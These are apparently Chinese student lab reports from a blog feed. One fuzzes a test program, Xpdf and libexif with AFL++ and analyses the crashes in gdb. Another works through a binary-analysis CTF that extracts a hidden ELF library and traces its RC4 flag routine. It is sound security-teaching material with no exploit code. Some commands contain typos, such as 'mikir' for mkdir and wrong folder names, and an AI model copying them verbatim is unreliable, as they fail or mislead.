<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Fuzzy%20Testing%20Technology/1.1.png" alt="输出结果" /></p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Fuzzy%20Testing%20Technology/1.2.png" alt="输出结果" /></p>
<p>2、输入 <code>ls /usr/local/bin/afl*</code> 查看文件发现安装成功。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Fuzzy%20Testing%20Technology/1.3.png" alt="输出结果" /></p>
<h2 id="task-1b初步尝试"><a class="markdownIt-Anchor" href="#task-1b初步尝试"></a> Task 1.b：初步尝试</h2>
<p>步骤：</p>
<p>1、在 Task 1 文件夹中，输入 <code>afl-gcc -g -o test test.c</code> 指令编译 test.c 文件，生成 test 可执行文件。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Fuzzy%20Testing%20Technology/1.4.png" alt="输出结果" /></p>
<p>2、输入 <code>mikir fuzz_in fuzz_out</code> 指令创建 fuzz_in 和 fuzz_out 文件夹，输入 <code>echo 'aaa' &gt; ./fuzz_in/case</code> 指令准备一个测试用例。</p>
<p>3、输入 <code>afl-fuzz -i ./fuzz_in -o ./fuzz_out ./test</code> 命令进行模糊测试。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Fuzzy%20Testing%20Technology/1.5.png" alt="输出结果" /></p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Fuzzy%20Testing%20Technology/1.6.png" alt="输出结果" /></p>
<p>Q： 请使用 xxd 查看你触发 crash 的 cases，并判断分别对应 test.c 中哪种漏洞，并解释漏洞产生的原因。注意，你的 crash cases 应覆盖所有 4 个漏洞。</p>
<p>A：进入 fuzz_in 文件夹下的 crashes 目录，可以看到所有的7个 crash cases。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Fuzzy%20Testing%20Technology/1.7.png" alt="输出结果" /></p>
<p>漏洞1: 如果输入的字符串的首字符为C并且长度为30，则异常退出：</p>
<p>输入 <code>xxd id:000002,sig:11,src:000001+000002,op:splice,rep:8</code> 指令查看第3个 crash case，发现这种情况下，输入的字符串的首字符为C并且长度为30。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Fuzzy%20Testing%20Technology/1.8.png" alt="输出结果" /></p>
<p>漏洞2: 如果输入的字符串的首字符为FAS并且长度为6，则异常退出：</p>
<p>输入 <code>xxd id:000001,sig:11,src:000004,op:arith8,pos:2,val:+25</code> 指令查看第2个 crash<br />
case，发现这种情况下，输入的字符串的前三个字符为FAT并且长度为6。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Fuzzy%20Testing%20Technology/1.9.png" alt="输出结果" /></p>
<p>漏洞3：存在栈溢出漏洞：</p>
<p>输入 <code>xxd id:000003,sig:06,src:000004,op:havoc,rep:128</code> 指令查看第4个 crash case，发现这种情况下，输入的字符串满足栈溢出条件。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Fuzzy%20Testing%20Technology/1.11.png" alt="输出结果" /></p>
<p>漏洞 4: 存在格式化字符串漏洞：</p>
<p>输入 <code>xxd id:000004,sig:06,src:000004,op:havoc,rep:16</code> 指令查看第5个 crash case，发现这种情况下，输入的字符串含有%格式化字符串漏洞。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Fuzzy%20Testing%20Technology/1.10.png" alt="输出结果" /></p>
<h1 id="task-2-基于-afl-测试-xpdf"><a class="markdownIt-Anchor" href="#task-2-基于-afl-测试-xpdf"></a> Task 2: 基于 AFL++ 测试 Xpdf</h1>
<h2 id="331-afl-安装"><a class="markdownIt-Anchor" href="#331-afl-安装"></a> 3.3.1 AFL++ 安装</h2>
<p>步骤：</p>
<p>安装必要的 packages。输入 <code>sudo apt-get update</code>， <code>sudo apt-get upgrade</code>，<code>sudo apt-get install automake autoconf build-essential llvm</code>，<code>cd $HOME</code>，<code>git clone https://github.com/AFLplusplus/AFLplusplus</code>，<code>cd AFLplusplus</code>，<code>make all</code>和<code>sudo make install</code> 指令。</p>
<h2 id="332-构建环境"><a class="markdownIt-Anchor" href="#332-构建环境"></a> 3.3.2 构建环境</h2>
<p>步骤：</p>
<p>1、为 Fuzz 目标创建一个新目录。输入 <code>cd \$HOME</code> 和 <code>mkdir fuzzing_xpdf &amp;&amp; cd fuzzing_xpdf</code> 指令。</p>
<p>2、下载 Xpdf 3.02 版本。输入 <code>wget https://dl.xpdfreader.com/old/xpdf-3.02.tar.gz</code> 和 <code>tar -xvzf xpdf-3.02.tar.gz</code> 指令。</p>
<p>3、构建 Xpdf。输入 <code>cd xpdf-3.02</code>， <code>./configure --prefix=&quot;$HOME/fuzzing_xpdf/install/&quot;</code>，<code>make</code> 和 <code>make install</code> 指令。</p>
<p>4、准备一些 PDF 样例文件用于测试。输入 <code>cd $HOME/fuzzing_xpdf</code>，<code>mkdir pdf_examples &amp;&amp; cd pdf_examples</code>，<code>wget https://github.com/mozilla/pdf.js-sample-files/raw/master/helloworld.pdf</code> 和 <code>wget https://www.melbpc.org.au/wp-content/uploads/2017/10/small-example-pdf-file.pdf</code> 指令。</p>
<p>5、测试 pdfinfo 二进制文件。输入 <code>cd $HOME/fuzzing_xpdf</code> 和 <code>./install/bin/pdfinfo -box -meta ./pdf_examples/helloworld.pdf</code> 指令。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Fuzzy%20Testing%20Technology/2.1.png" alt="输出结果" /></p>
<h2 id="333-开始-fuzz"><a class="markdownIt-Anchor" href="#333-开始-fuzz"></a> 3.3.3 开始 Fuzz</h2>
<p>步骤：</p>
<p>1、清理所有先前编译的目标文件和可执行文件。输入 <code>rm -r $HOME/fuzzing_xpdf/install</code>，<code>cd $HOME/fuzzing_xpdf/xpdf-3.02/</code> 和 <code>make clean</code> 指令。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Fuzzy%20Testing%20Technology/2.2.png" alt="输出结果" /></p>
<p>2、使用 afl-clang-fast 编译器构建 xpdf。输入<code>CC=$HOME/AFLplusplus/afl-clang-fast CXX=$HOME/AFLplusplus/afl-clang-fast++ ./configure --prefix=&quot;$HOME/fuzzing_xpdf/install/&quot;</code>，make 和 make install 指令。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Fuzzy%20Testing%20Technology/2.3.png" alt="输出结果" /></p>
<p>3、使用 AFL++ 进行模糊测试。输入 <code>$HOME/AFLplusplus/afl-fuzz -i $HOME/fuzzing_xpdf/pdf_examples/ -o $HOME/fuzzing_xpdf/out/ -s 123 -- $HOME/fuzzing_xpdf/install/bin/pdftotext @@ $HOME/fuzzing_xpdf/output</code> 指令。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Fuzzy%20Testing%20Technology/2.3.png" alt="输出结果" /></p>
<p>发现了6个 crash cases。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Fuzzy%20Testing%20Technology/2.4.png" alt="输出结果" /></p>
<p>4、配置 gdb 进行调试。输入 <code>gdb --args $HOME/fuzzing_xpdf/install/bin/pdftotext $HOME/fuzzing_xpdf/out/default/crashes/id:000000,sig:11,src:000001,time:100335,execs:,op:havoc,rep:2 $HOME/fuzzing_xpdf/outputn</code> 指令。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Fuzzy%20Testing%20Technology/2.7.png" alt="输出结果" /></p>
<p>输入 <code>run</code> 指令运行。发现错误类型为 SIGSEGV。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Fuzzy%20Testing%20Technology/2.8.png" alt="输出结果" /></p>
<p>输入 <code>bt</code> 指令回溯堆栈。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Fuzzy%20Testing%20Technology/2.9.png" alt="输出结果" /></p>
<p>Q：在实验报告中，请解释此现象的产生原因。</p>
<p>A：从 GDB 输出可以看出，程序在执行 __GI__IO_file_xsgetn 函数时发生了段错误(SIGSEGV)。该函数从 fileops.c 文件中读取数据，但是找不到该文件。从 bt 回溯中可以发现，此错误是由于在函数 Parser::makeStream 中创建文件时发生错误。</p>
<p>5、在 Parser::getObj() 函数设置断点并执行程序。输入 <code>b Parser::getObj</code> 和 <code>run</code> 指令。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Fuzzy%20Testing%20Technology/2.9.png" alt="输出结果" /></p>
<p>Q：请根据上述步骤结合 gdb 的使用，进行 crash 的复现和分析。完成后，请描述观察结果，并解释引起这种漏洞的原因。</p>
<p>A：crash 的复现：输入 <code>gdb --args $HOME/fuzzing_xpdf/install/bin/pdftotext $HOME/fuzzing_xpdf/out/default/crashes/id:000000,sig:11,src:000001,time:100335,execs:87679,op:havoc,rep:2 $HOME/fuzzing_xpdf/outputn</code> 指令即可（见图17和图18）。</p>
<p>crash的分析：输入 c 继续运行，发现程序回到了 Parser::getObj 函数，而堆栈在不断使用。可以发现该程序是由于某种原因一直重复 Parser::getObj 函数直至堆栈耗尽而出错。接下来输入 n 一步步调试该程序：</p>
<pre><code>Parser::getObj (this=0x5555556c9c10, obj=0x7fffffffdc70, 
fileKey=0x0, encAlgorithm=cryptRC4, keyLength=0x0, objNum=0x0, objGen=0x0)
at Parser.cc:41
                int objNum, int objGen) &#123;
Object obj2;
if (inlineImg == 2) &#123;
    if (buf1.isCmd(&quot;[&quot;)) &#123;
        &#125; else if (buf1.isCmd(&quot;&lt;&lt;&quot;)) &#123;
            &#125; else if (buf1.isInt()) &#123;
                num = buf1.getInt();
                shift();
                if (buf1.isInt() &amp;&amp; buf2.isCmd(&quot;R&quot;)) &#123;
                    obj-&gt;initInt(num);
                    return obj;
                    &#125;
                    XRef::readXRefTable (this=0x5555556ca230, parser=0x5555556c9c10, 
                    pos=0x7fffffffdd2c) at XRef.cc:397
                            entry.gen = obj.getInt();
                obj.free();
                parser-&gt;getObj(&amp;obj);
                Parser::getObj (this=0x5555556c9c10, obj=0x7fffffffdc70, 
                fileKey=0x0, encAlgorithm=cryptRC4, keyLength=0x0, objNum=0x0, objGen=0x0)
                at Parser.cc:41
                                int objNum, int objGen) &#123;       
</code></pre>
<p>发现迭代的 Parser::getObj 函数的参数未发生变化，于是导致了无限循环。</p>
<h1 id="task-3-使用-qemu-模式执行模糊测试无程序源码"><a class="markdownIt-Anchor" href="#task-3-使用-qemu-模式执行模糊测试无程序源码"></a> Task 3: 使用 QEMU 模式执行模糊测试（无程序源码）</h1>
<h2 id="341-安装-qemu-模式aflplusplus-文件夹下"><a class="markdownIt-Anchor" href="#341-安装-qemu-模式aflplusplus-文件夹下"></a> 3.4.1 安装 QEMU 模式（AFLplusplus 文件夹下）</h2>
<p>步骤：</p>
<p>1、安装 QEMU 模式所需的依赖包。输入 <code>sudo apt-get install libglib2.0-dev ninja-build</code>，<code>cd qemu_mode</code> 和 <code>./build_qemu_support.sh</code> 指令。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Fuzzy%20Testing%20Technology/3.1.png" alt="输出结果" /></p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Fuzzy%20Testing%20Technology/3.2.png" alt="输出结果" /></p>
<p>发现显示 [+] libqasan ready 和 [+] all和 sudo done for qemu_mode, enjoy!，说明安装成功。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Fuzzy%20Testing%20Technology/3.3.png" alt="输出结果" /></p>
<p>2、返回到上级目录并重新安装 AFL++。输入 <code>cd ..</code> 和 <code>sudo make install</code> 指令。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Fuzzy%20Testing%20Technology/3.4.png" alt="输出结果" /></p>
<p>3、验证 afl-qemu-trace 是否已正确安装在 bin 目录下。输入 <code>ls /usr/local/bin/afl*</code> 指令。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Fuzzy%20Testing%20Technology/3.5.png" alt="输出结果" /></p>
<h2 id="342-使用-qemu-模式执行模糊测试"><a class="markdownIt-Anchor" href="#342-使用-qemu-模式执行模糊测试"></a> 3.4.2 使用 QEMU 模式执行模糊测试</h2>
<p>步骤：</p>
<p>1、更新 libc 库。输入 <code>sudo vi /etc/apt/sources.list</code> 指令打开sources.list文件以添加新的源，在文件中添加 <code>deb http://th.archive.ubuntu.com/ubuntu jammy main</code> 来更新 libc。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Fuzzy%20Testing%20Technology/3.6.png" alt="输出结果" /></p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Fuzzy%20Testing%20Technology/3.7.png" alt="输出结果" /></p>
<p>2、更新系统软件源列表并安装最新版本的 libc。输入 <code>sudo apt update</code> 和 <code>sudo apt install libc6</code> 指令。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Fuzzy%20Testing%20Technology/3.8.png" alt="输出结果" /></p>
<p>3、输入 <code>$HOME/AFLplusplus/afl-fuzz -Q -i $HOME/qemu_fuzz/exif-samples/jpg/ -o $HOME/qemu_fuzz/out -s 123 -- $HOME/qemu_fuzz/install/bin/exif @@</code> 进行模糊测试。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Fuzzy%20Testing%20Technology/3.9.png" alt="输出结果" /></p>
<h2 id="343-分析得到的-crash"><a class="markdownIt-Anchor" href="#343-分析得到的-crash"></a> 3.4.3 分析得到的 crash</h2>
<p>在 crashes 文件夹中，出现了如下的14个 crash cases。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Fuzzy%20Testing%20Technology/3.10.png" alt="输出结果" /></p>
<p>Q：请研究该程序中已知的 CVE-2009-3895 或 CVE-2012-2836 漏洞。结合 afl-fuzz -Q 和 gdb 工具，按照 Task 2 的步骤，找出至少一个漏洞的原因，并详细解释如何产生这些漏洞。</p>
<p>A：crash 的复现：输入 <code>gdb --args $HOME/qemu_fuzz/install/bin/exif ./id:000000,sig:06,src:000060+000464,time:2201871,execs:803513,op:splice,rep:6</code> 指令。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Fuzzy%20Testing%20Technology/3.11.png" alt="输出结果" /></p>
<p>crash 的分析：输入 <code>bt</code> 指令回溯。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Fuzzy%20Testing%20Technology/3.12.png" alt="输出结果" /></p>
<p>这个堆栈跟踪显示了一个程序崩溃，原因是在尝试重新分配内存时出现了问题。具体来说，错误消息 &quot;realloc(): invalid next size&quot; 表示程序试图重新分配的内存块的大小不正确。</p>
<p>在堆栈跟踪中，我们可以看到这个问题发生在 exif_entry_realloc 函数中，这个函数试图重新分配一个 ExifEntry 结构的内存。这个函数是在 exif_entry_fix 函数中调用的，该函数试图修复一个 ExifEntry。</p>
<p>这是一个缓冲区溢出漏洞，当输入数据可以控制重新分配的大小，攻击者可能能够利用这个漏洞来引发程序崩溃，或者执行任意代码。</p>
]]></content>
      <categories>
        <category>逆向工程与汇编语言</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Program-Compilation-and-ELF-Format-Lab-2</title>
    <url>/posts/54097cbd.html</url>
    <content><![CDATA[<h1 id="实验目的"><a class="markdownIt-Anchor" href="#实验目的"></a> 实验目的</h1>
<p>1、学习在 Linux 操作系统上进行分析所需的基本工具。</p>
<p>2、找出隐藏在 payload 中的 flag。</p>
<h1 id="实验原理"><a class="markdownIt-Anchor" href="#实验原理"></a> 实验原理</h1>
<p>使用常用分析工具。</p>
<h1 id="实验环境"><a class="markdownIt-Anchor" href="#实验环境"></a> 实验环境</h1>
<p>使用 binary 虚拟机，即在 Lab 1 中已经配置过的环境（包括时间戳）。</p>
<h1 id="task-1使用-file-解决类型问题"><a class="markdownIt-Anchor" href="#task-1使用-file-解决类型问题"></a> Task 1：使用 file 解决类型问题</h1>
<p>步骤：</p>
<p>1、进入 chapter5 文件中，使用 file payload 指令查看 payload 文件的类型。</p>
<p>2、使用 head payload 指令查看 payload 文件前十行得内容。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/1.1.png" alt="输出结果" /></p>
<p>Q：这个文件使用了什么编码方式？</p>
<p>A：进入在线分析网站 <a href="https://www.boxentriq.com/code-breaking/cipher-identifier">https://www.boxentriq.com/code-breaking/cipher-identifier</a> 中分析可得该编码方式为 base64 编码。并且，判断一段文本是否为 Base64 编码可以使用以下几个方法:</p>
<p>检查字符集:Base64 编码只使用 A-Z、a-z、0-9 和 +/= 这 64 个字符。如果一段文本只包含这些字符,那很可能是 Base64 编码的。</p>
<p>检查长度:Base64 编码后的字符串长度通常是 4 的倍数。如果一段文本的长度是 4 的倍数,那也很可能是 Base64 编码的。</p>
<p>检查结尾:Base64 编码的结尾通常会有 = 或 == 来表示编码字符串的长度不是 4 的倍数。</p>
<p>尝试解码:可以尝试使用 base64 命令对该文本进行解码,如果解码成功并且内容可读,那就证明该文本是 Base64 编码的。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/1.2.png" alt="输出结果" /></p>
<p>3、输入 base64 -d payload &gt; decoded_payload 指令解码 payload 文件并将解码内容保存在 decoded_payload 文件中</p>
<p>4、输入 file decode_payload 指令发现无法打开该文件，输入 file -c decode_payload 指令发现该压缩文件中有两个文件 ctf 和 67b8601。</p>
<p>5、输入 tar zxvf decoded_payload 指令解压该文件，输入 file ctf 指令发现该文件为一个 ELF 文件，输入 file 67b8601 指令发现该文件为一个 PC bitmap 文件。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/1.3.png" alt="输出结果" /></p>
<p>Q：这两个文件分别是什么类型？</p>
<p>A：ctf文件是一个该文件为一个 ELF 文件，67b8601文件为一个 PC bitmap 文件。</p>
<h1 id="task-2使用-ldd-探索依赖性"><a class="markdownIt-Anchor" href="#task-2使用-ldd-探索依赖性"></a> Task 2：使用 ldd 探索依赖性</h1>
<p>步骤：</p>
<p>1、输入 ./ctf 指令，动态链接器会提示缺少某个库文件。</p>
<p>2、输入 ldd ctf 指令，显示出共享库和依赖关系。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/2.1.png" alt="输出结果" /></p>
<p>Q：这个文件存在哪些未解析的依赖项？</p>
<p>A：从给出的 ldd 命令输出结果可以看出，存在一个未解析的依赖项 <a href="http://lib5ae9b7f.so">lib5ae9b7f.so</a>。</p>
<p>3、输入 grep 'ELF' ./* 指令，查看所有 ELF 文件的头部信息，发现&quot;ELF&quot;字符出现在了 67b8601 文件中（输入 grep 'ELF' 67b8601 指令可以发现）。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/2.2.png" alt="输出结果" /></p>
<h1 id="task-3使用-xxd-查看文件内容"><a class="markdownIt-Anchor" href="#task-3使用-xxd-查看文件内容"></a> Task 3：使用 xxd 查看文件内容</h1>
<p>步骤：</p>
<p>输入 xxd 67b8601 | head -n 15 指令分析 67b8601 文件的前 15 行。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/3.1.png" alt="输出结果" /></p>
<p>Q：xxd 默认每行显示多少字节的内容？</p>
<p>A：xxd 默认每行显示16字节的内容。</p>
<h1 id="task-4使用-readelf-解析并提取-elf-库文件"><a class="markdownIt-Anchor" href="#task-4使用-readelf-解析并提取-elf-库文件"></a> Task 4：使用 readelf 解析并提取 ELF 库文件</h1>
<p>步骤：</p>
<p>1、0x7f 在偏移量为 0x35 的位置处，转换为10进制为53，因此输入 tail -c +53 67b8601 &gt; temp_elf 指令截取从偏移量 0x35 到文件末尾。</p>
<p>2、输入 readelf -h temp_elf 指令查看 temp_elf 文件的 ELF 头部信息。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/4.1.png" alt="输出结果" /></p>
<p>3、由上图可知，Start of section headers = 8568 (bytes into file)，Size of section headers = 64 (bytes)，Number of section headers = 27，由此可知 size = 10296。输入head -c 10296 temp_elf &gt; <a href="http://lib5ae9b7f.so">lib5ae9b7f.so</a> 指令将 temp_elf 文件中开头至偏移量为 10296 的内容截取到 <a href="http://lib5ae9b7f.so">lib5ae9b7f.so</a> 文件中。</p>
<p>4、输入 export LD_LIBRARY_PATH=/home/binary/code/chapter5 指令将当前目录添加到 LD_LIBRARY_PATH 环境变量中。</p>
<p>5、输入 .\ctf 指令，发现程序成功运行，没有报错。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/4.2.png" alt="输出结果" /></p>
<p>Q：是否一定要去除隐藏的 ELF 文件的尾部无效部分？不去除的情况下这个库文件是否还有效？</p>
<p>A：不一定。这个库文件依然是有效的。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/4.3.png" alt="输出结果" /></p>
<h1 id="task-5使用-nm-解析符号"><a class="markdownIt-Anchor" href="#task-5使用-nm-解析符号"></a> Task 5：使用 nm 解析符号</h1>
<p>步骤：</p>
<p>1、输入 echo $? 指令，发现其中包含的 ctf 退出状态为 1，表示有错误。</p>
<p>2、输入 readelf -s <a href="http://lib5ae9b7f.so">lib5ae9b7f.so</a> 指令，查看库文件的符号表。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/5.1.png" alt="输出结果" /></p>
<p>3、输入 nm <a href="http://lib5ae9b7f.so">lib5ae9b7f.so</a> 指令，显示 no symbols，说明文件已经被剥离。</p>
<p>4、输入 nm -D <a href="http://lib5ae9b7f.so">lib5ae9b7f.so</a> 指令，获得被修饰的符号名称。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/5.2.png" alt="输出结果" /></p>
<p>5、输入 nm -D --demangle <a href="http://lib5ae9b7f.so">lib5ae9b7f.so</a> 指令，获得多个有意义的函数。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/5.3.png" alt="输出结果" /></p>
<pre><code>......
0000000000000c60 T rc4_decrypt(rc4_state_t*, unsigned char*, int)
0000000000000c70 T rc4_decrypt(rc4_state_t*, std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;&amp;)
0000000000000b40 T rc4_encrypt(rc4_state_t*, unsigned char*, int)
0000000000000bc0 T rc4_encrypt(rc4_state_t*, std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;&amp;)
0000000000000cb0 T rc4_init(rc4_state_t*, unsigned char*, int)
                 U std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::_M_create(unsigned long&amp;, unsigned long)
                 U std::__throw_logic_error(char const*)
</code></pre>
<p>Q：是哪个加密算法？包含了这个加密算法的什么功能？</p>
<p>A：这是一个包含RC4加密算法实现的库文件。这个文件包含的与RC4加密相关的函数有:rc4_init(rc4_state_t*, unsigned char*, int) - 初始化RC4加密状态,使用给定的密钥。rc4_encrypt(rc4_state_t*, unsigned char*, int) - 使用RC4加密给定的明文数据。rc4_decrypt(rc4_state_t*, unsigned char*, int) - 使用RC4解密给定的密文数据。还有一些重载函数如rc4_encrypt和rc4_decrypt接受std::string类型的数据。</p>
<h1 id="task-6使用-strings-查找-hints"><a class="markdownIt-Anchor" href="#task-6使用-strings-查找-hints"></a> Task 6：使用 strings 查找 Hints</h1>
<p>步骤：</p>
<p>输入 strings ctf 指令查看二进制文件的字符串，并未找到有关的指令或者内容字符。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/6.1.png" alt="输出结果" /></p>
<h1 id="task-7使用-strace-和-ltrace-跟踪系统调用和库文件调用"><a class="markdownIt-Anchor" href="#task-7使用-strace-和-ltrace-跟踪系统调用和库文件调用"></a> Task 7：使用 strace 和 ltrace 跟踪系统调用和库文件调用</h1>
<p>步骤：</p>
<p>1、输入 strace ./ctf show_me_the_flag 指令获得跟踪 ctf 的系统调用行为。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/7.1.png" alt="输出结果" /></p>
<pre><code>......
write(1, &quot;checking 'show_me_the_flag'\n&quot;, 28checking 'show_me_the_flag') = 28
write(1, &quot;ok\n&quot;, 3ok) = 3
exit_group(1) = ?
</code></pre>
<p>Q：这 3 个系统调用分别是做什么的？</p>
<p>A：向终端输出 &quot;checking 'show_me_the_flag'\n&quot;；向终端输出 &quot;ok\n&quot;；终止当前进程及其子进程，退出状态码为 1。</p>
<p>2、输入 ltrace -i -C ./ctf show_me_the_flag 指令可以看到初始化了加密函数，该函数位于之前提取的库文件中；接着为一个 C++ 字符串赋值，大概是用加密消息对其进行初始化；然后调用解密函数解密此消息，并将解密后的消息分配到新的 C++ 字符串。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/7.2.png" alt="输出结果" /></p>
<pre><code>[0x400fe9] __libc_start_main(0x400bc0, 2, 0x7ffcb01844d8, 0x4010c0 &lt;unfinished ...&gt;
[0x400c44] __printf_chk(1, 0x401158, 0x7ffcb01862da, 160checking 'show_me_the_flag')    = 28
[0x400c51] strcmp(&quot;show_me_the_flag&quot;, &quot;show_me_the_flag&quot;)    = 0
[0x400cf0] puts(&quot;ok&quot;ok) = 3
[0x400d07] rc4_init(rc4_state_t*, unsigned char*, int)(0x7ffcb01842a0, 0x4011c0, 66, -1) = 0
[0x400d14] std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::assign(char const*)(0x7ffcb01841e0, 0x40117b, 58, 3) = 0x7ffcb01841e0
[0x400d29] rc4_decrypt(rc4_state_t*, std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;&amp;)(0x7ffcb0184240, 0x7ffcb01842a0, 0x7ffcb01841e0, 0x7e889f91) = 0x7ffcb0184240
[0x400d36] std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::_M_assign(std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; const&amp;)(0x7ffcb01841e0, 0x7ffcb0184240, 0x7ffcb0184250, 0) = 0
[0x400d53] getenv(&quot;GUESSME&quot;)                                 = nil
[0xffffffffffffffff] +++ exited (status 1) +++
</code></pre>
<p>3、输入 GUESSME='foobar' ./ctf show_me_the_flag 指令，将 GUESSME 环境变量设置为虚拟值，发现输出新的一行，提示再猜一次。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/7.3.png" alt="输出结果" /></p>
<p>4、输入 GUESSME=&quot;123&quot; ltrace -i -C ./ctf show_me_the_fla 指令，ctf 继续分配并解密另一个 C++ 字符串，但是看不到有关 GUESSME 的任何提示。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/7.4.png" alt="输出结果" /></p>
<h1 id="task-8使用-objdump-检查指令级别的行为"><a class="markdownIt-Anchor" href="#task-8使用-objdump-检查指令级别的行为"></a> Task 8：使用 objdump 检查指令级别的行为</h1>
<p>步骤：</p>
<p>1、输入 objdump -d -M intel ctf 指令，</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/8.1.png" alt="输出结果" /></p>
<pre><code>ctf:     file format elf64-x86-64

Contents of section .rodata:
 401140 01000200 44454255 473a2061 7267765b  ....DEBUG: argv[
 401150 315d203d 20257300 63686563 6b696e67  1] = %s.checking
 401160 20272573 270a0073 686f775f 6d655f74   '%s'..show_me_t
 401170 68655f66 6c616700 6f6b004f 89df919f  he_flag.ok.O....
 401180 887e009a 5b38babe 27ac0e3e 434d6285  .~..[8..'..&gt;CMb.
 401190 55868954 3848a34d 00192d76 40505e3a  U..T8H.M..-v@P^:
 4011a0 00726200 666c6167 203d2025 730a0067  .rb.flag = %s..g
 4011b0 75657373 20616761 696e2100 00000000  uess again!.....
 4011c0 49742773 206b696e 6461206c 696b6520  It's kinda like 
 4011d0 4c6f7569 7369616e 612e204f 72204461  Louisiana. Or Da
 4011e0 676f6261 682e2044 61676f62 6168202d  gobah. Dagobah -
 4011f0 20576865 72652059 6f646120 6c697665   Where Yoda live
 401200 73210000 00000000                    s!......   
</code></pre>
<p>Q：&quot;guess again&quot;存放的地址位置是什么？</p>
<p>A：0x4011af到0x4011b9。</p>
<p>2、输入 objdump -d -M intel ctf 指令，查看&quot;guess again&quot;周围的指令。</p>
